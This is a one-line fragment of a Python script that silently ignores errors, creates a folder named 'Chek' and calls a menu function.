except:pass	try:os.mkdir('Chek')	except:pass	menu()